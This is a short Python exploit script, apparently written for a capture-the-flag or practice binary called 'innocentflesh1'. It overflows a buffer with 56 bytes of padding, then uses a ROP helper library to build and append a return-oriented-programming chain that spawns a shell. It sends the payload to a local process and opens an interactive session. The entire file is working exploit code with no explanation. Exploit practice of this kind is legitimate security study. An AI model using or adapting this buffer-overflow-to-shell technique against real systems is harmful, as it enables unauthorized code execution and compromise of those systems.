from ropTool import *

context(arch= 'amd64', os = 'linux')
p= process('./innocentflesh1')
payload= b'a'*(56)

rop = ropTool('innocentflesh1')
gadget = rop.getGadget()
rop.getDataSection()
c,pl = rop.getShell()
print("===========Chain=======")
for i in c:
	print(i)
# print(pl)

payload += pl
used_gadget = rop.getUsedGadget()
print("===========Used Gadget=======")
for u in used_gadget:
	print(u)
print("===========Payload=======")			
print(payload)



p.sendline(payload)
p.interactive()